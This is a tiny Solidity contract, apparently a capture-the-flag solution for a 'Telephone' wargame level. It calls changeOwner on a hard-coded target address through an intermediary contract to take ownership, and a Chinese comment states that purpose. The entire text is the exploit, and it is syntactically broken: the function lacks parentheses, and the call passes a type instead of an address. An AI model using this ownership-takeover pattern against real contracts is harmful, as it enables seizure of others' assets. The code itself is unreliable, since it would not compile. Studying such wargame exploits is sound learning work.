contract Attack {
  //用这个合约去调用Telephone合约的函数
  Telephone t=Telephone(0x451D60876A623639913DeA22d28eeAb6ed7B27Dc);
  
  function attack public {
    t.changeOwner(address);
  }
}
